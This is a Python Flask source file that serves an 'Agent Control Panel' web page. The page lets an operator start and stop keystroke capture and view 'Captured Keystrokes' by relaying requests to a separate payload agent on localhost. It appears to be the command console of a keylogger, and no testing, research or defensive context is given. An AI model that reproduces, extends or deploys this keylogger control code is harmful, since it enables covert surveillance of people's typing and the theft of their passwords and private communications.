from flask import Flask, render_template_string, request
import requests

app = Flask(__name__)
PAYLOAD_API = "http://127.0.0.1:5000"  # Agent's port


HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Agent Control Panel</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f4f4f4;
            padding: 20px;
            color: #333;
        }
        h1 { color: #222; }
        button {
            padding: 10px 20px;
            font-size: 16px;
            margin-right: 10px;
            cursor: pointer;
        }
        pre {
            background: white;
            padding: 15px;
            border: 1px solid #ccc;
            height: 60vh;
            overflow-y: auto;
            white-space: pre-wrap;
        }
    </style>
    <script>
        function controlAgent(action) {
            fetch("/" + action, { method: "POST" })
            .then(() => alert("Agent " + action + "ed"))
            .catch(err => alert("Error: " + err));
        }

        function fetchPeople() {
            fetch("/people")
            .then(res => res.text())
            .then(data => {
                document.getElementById("people-output").innerText = data || "[No activity captured yet]";
            })
            .catch(err => alert("Error fetching data: " + err));
        }
    </script>
</head>
<body>
    <h1>Agent Control Panel</h1>
    <button onclick="controlAgent('start')">Start Capture</button>
    <button onclick="controlAgent('stop')">Stop Capture</button>
    <button onclick="fetchPeople()">Get Captured Data</button>

    <h2>Captured Keystrokes</h2>
    <pre id="people-output">[Click "Get Captured Data" to refresh]</pre>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_PAGE)

@app.route('/start', methods=['POST'])
def start():
    try:
        r = requests.post(f"{PAYLOAD_API}/start", timeout=3)
        return '', r.status_code
    except Exception as e:
        print(f"[ERROR] Failed to start capture: {e}")
        return str(e), 500

@app.route('/stop', methods=['POST'])
def stop():
    try:
        r = requests.post(f"{PAYLOAD_API}/stop", timeout=3)
        return '', r.status_code
    except Exception as e:
        print(f"[ERROR] Failed to stop capture: {e}")
        return str(e), 500

@app.route('/people')
def people():
    try:
        r = requests.get(f"{PAYLOAD_API}/getpeople", timeout=3)
        return r.text, r.status_code
    except Exception as e:
        print(f"[ERROR] Failed to get captured data: {e}")
        return "Error getting captured data", 500

if __name__ == '__main__':
    app.run(debug=False, port=7000)
